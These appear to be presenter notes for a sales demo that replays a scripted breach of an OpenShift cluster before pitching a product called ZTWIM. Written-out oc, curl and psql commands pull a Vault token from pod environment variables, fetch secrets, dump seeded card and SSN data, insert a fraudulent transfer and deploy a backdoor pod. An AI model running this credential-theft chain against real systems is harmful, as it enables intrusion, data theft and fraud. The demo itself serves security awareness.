# Interactive Attack Demo - Speaker Notes

## Overview

This is a **pure terminal session** with typing animation. Commands type out character-by-character like someone is manually typing them.

**Duration:** 15-20 minutes

---

## How It Works

1. **Output displays**
2. **Blank `$ ` prompt appears**
3. **You press Enter** (silently)
4. **Command types out** character-by-character
5. **Command executes** and shows real output
6. **You narrate** what just happened

**No commentary in the script - just commands and output. You provide all narration.**

---

## Running the Demo

```bash
cd /home/srickerd/ztwim-vault-demo/scripts
./interactive-attack-demo.sh
```

Press Enter when you see blank `$ ` prompts.

---

## Commands in Order (What You'll See)

### Opening

```
================================================================================
          PRODUCTION DATABASE BREACH - Live OpenShift Cluster
================================================================================

$ oc get pods -n production
$ oc get deployment payment-processor -n production
$ export POD=payment-processor-xxxxx
$ echo "Target pod: $POD"
```

**What to say:**
> "This is a live OpenShift cluster with a real production database. We're going to watch a complete credential theft attack unfold."

> "First, reconnaissance - what's running in production?"

---

### Phase 1: Credential Discovery

```
$ oc exec -n production $POD -- printenv | grep -i vault
```

**Output shows:**
```
VAULT_TOKEN=hvs.CAES...
VAULT_ADDR=http://vault...
```

**What to say:**
> "Attacker exploits an RCE vulnerability, gets shell access."

> "First thing they do: check environment variables."

> **[After output appears]**

> "There it is. A Vault token. Right there in an environment variable. Static. Valid for 90 days. Works from anywhere."

---

### Phase 2: Vault Access - Database Credentials

```
$ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/database/production | jq .data.data'
```

**Output shows:**
```json
{
  "connection_string": "postgresql://customerdb:SuperSecret123!@...",
  "database": "customers",
  "host": "customer-database.production.svc.cluster.local",
  "password": "SuperSecret123!",
  "port": "5432",
  "username": "customerdb"
}
```

**What to say:**
> "Now they use the stolen token to access Vault. Remember - this works from anywhere."

> **[After output appears]**

> "Complete database credentials. Connection string, password, everything they need."

---

### Phase 3: Vault Access - API Keys

```
$ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'
```

**Output shows:**
```json
{
  "aws_access_key": "AKIAI...",
  "aws_secret_key": "wJalr...",
  "sendgrid_api_key": "SG....",
  "stripe_secret_key": "sk_test_..."
}
```

**What to say:**
> "And the production API keys."

> **[After output appears]**

> "Stripe for payments. AWS for infrastructure. SendGrid for email. Complete system access."

---

### Phase 4: Database Access - Tables

```
$ oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c '\dt'
```

**Output shows:**
```
            List of relations
 Schema |    Name      | Type  |   Owner    
--------+--------------+-------+------------
 public | customers    | table | customerdb
 public | transactions | table | customerdb
```

**What to say:**
> "Now they connect directly to the production database using the stolen credentials."

> **[After output appears]**

> "There's the customers table. Let's see what's in it..."

---

### Phase 5: Customer Count

```
$ oc exec -n production $POD -- psql ... 'SELECT COUNT(*) as total_customers FROM customers;'
```

**Output shows:**
```
 total_customers 
-----------------
              10
```

**What to say:**
> "Ten customers in the database."

---

### Phase 6: Customer Data - **THE BIG MOMENT**

```
$ oc exec -n production $POD -- psql ... 'SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;'
```

**Output shows:**
```
  customer_name  |          email           | account_balance |    credit_card      |     ssn     
-----------------+--------------------------+-----------------+---------------------+-------------
 Jennifer Taylor | jtaylor@example.com      |       267890.00 | 4532-7777-8888-9999 | 678-90-1234
 Emily Rodriguez | emily.r@example.com      |       198500.00 | 4024-1111-2222-3333 | 456-78-9012
 Maria Garcia    | mgarcia@example.com      |       178950.50 | 4532-8888-9999-0000 | 012-34-5678
 Lisa Wong       | lwong@example.com        |       156780.25 | 5425-9876-5432-1098 | 890-12-3456
 John Anderson   | john.anderson@example.com|       125430.50 | 4532-1234-5678-9012 | 123-45-6789
```

**What to say:**

> "Exfiltrating customer data..."

> **[Let the output appear]**

> **[PAUSE - Let them read it - 5 seconds]**

> "Look at this. Real customer data."

> "Credit card numbers. Social Security numbers. Account balances."

> **[Read slowly from screen]:**

> "Jennifer Taylor - two hundred sixty-seven thousand dollars."

> "Emily Rodriguez - one hundred ninety-eight thousand."

> "Maria Garcia - one hundred seventy-eight thousand."

> **[Pause]**

> "These are real people. Real money."

---

### Phase 7: Total at Risk

```
$ oc exec -n production $POD -- psql ... | xargs echo 'Total at risk: $'
```

**Output shows:**
```
Total at risk: $ 1238652.75
```

**What to say:**

> **[After output appears]**

> "Over **one point two million dollars**. Completely exposed."

> **[Pause for 3 seconds]**

---

### Phase 8: Fraudulent Transaction - **THE CRIME**

```
$ oc exec -n production $POD -- psql ... "INSERT INTO transactions ... 'UNAUTHORIZED - Attacker controlled transfer' ..."
```

**Output shows:**
```
INSERT 0 1
```

**What to say:**

> "They have write access to the database. Watch this..."

> **[After output appears]**

> "Transaction created. Let's see what they just did..."

---

### Phase 9: Transaction History

```
$ oc exec -n production $POD -- psql ... 'SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;'
```

**Output shows:**
```
 id | customer_id |  amount   | transaction_type |              description               
----+-------------+-----------+------------------+---------------------------------------
  1 |           1 | -50000.00 | withdrawal       | UNAUTHORIZED - Attacker controlled...
```

**What to say:**

> **[After output appears]**

> "Fifty thousand dollars. Unauthorized withdrawal. From John Anderson's account."

> **[Pause]**

> "**This is no longer just data theft. This is financial fraud. This is a crime.**"

> **[Pause]**

> "And it looks like a legitimate transaction in the database."

---

### Phase 10: Backdoor Deployment

```
$ oc apply -f /tmp/backdoor.yaml
```

**Output shows:**
```
pod/backdoor-exfil created
```

**What to say:**

> "Finally, they deploy a backdoor to maintain access."

> **[After output appears]**

> "Even if we patch the vulnerability tonight..."

---

### Phase 11: Backdoor Verification

```
$ oc get pod backdoor-exfil -n production
```

**Output shows:**
```
NAME             READY   STATUS    RESTARTS   AGE
backdoor-exfil   1/1     Running   0          5s
```

**What to say:**

> **[After output appears]**

> "...they can come back tomorrow. For the next **ninety days**."

---

### Final Summary

**Screen shows:**
```
================================================================================

Attack complete:

  - Vault token stolen (90-day validity)
  - Database credentials compromised
  - API keys stolen (Stripe, AWS, SendGrid)
  - Customer data exfiltrated (10 records, $1.2M+)
  - Fraudulent transaction created ($50,000)
  - Backdoor deployed for persistence

================================================================================
```

**What to say:**

> "Let's look at what just happened."

> **[Read through the list]**

> "Vault token stolen - ninety days of access."

> "Complete database access - all credentials."

> "API keys for Stripe, AWS, SendGrid - complete system compromise."

> "Customer data - ten records, over one point two million dollars."

> "Fraudulent transaction - fifty thousand dollars. That's a crime."

> "And a backdoor for persistence."

> **[Pause]**

> "This is based on real breaches. Capital One - stolen credentials. Uber - stolen credentials. SolarWinds - stolen credentials. Same pattern every time."

> **[Final pause]**

> "Now let me show you how ZTWIM prevents this entire attack chain..."

---

## Pacing Guide

### Go Slow:
- **Customer data display** - Pause 5 seconds, let them read
- **After "$1.2 million"** - Pause 3 seconds
- **After "This is a crime"** - Pause 3 seconds
- **After "90 days"** - Pause 3 seconds

### Speed Up:
- Initial reconnaissance commands
- Commands they understand immediately
- Technical details

---

## Key Phrases (Use These Exact Words)

- "**Real customer data. Real money.**"
- "**One point two million dollars.**"
- "**This is financial fraud. This is a crime.**"
- "**Ninety days of access.**"
- "**Works from anywhere in the world.**"

---

## Emotional Journey

The demo creates this arc:

1. **Curious** - "Let's see what happens"
2. **Concerned** - "They got the token..."
3. **Alarmed** - "They're in the database..."
4. **Horrified** - "Those are REAL people!" ⚠️ **THE MOMENT**
5. **Despair** - "And they can commit fraud... for 90 days..."
6. **Motivated** - "We NEED to prevent this"

---

## Troubleshooting

### If a command fails:
- Stay calm
- Say: "Let me check that..."
- Run: `oc get pods -n production`
- Skip to next phase if needed

### If typing is too slow/fast:
Edit the script and change:
```bash
local delay="0.05"  # Make smaller for faster, bigger for slower
```

### If you lose your place:
- Look at what just executed
- Continue pressing Enter
- The script guides you through in order

---

## Success Indicators

**You know it worked when:**

✅ Silence during customer data display (they're reading)  
✅ Someone gasps or says "oh no"  
✅ Questions about ZTWIM immediately after  
✅ "When can we implement this?"  
✅ Security team taking photos of the screen  

---

**You're not running a script. You're showing them a breach in real-time.** 🎯
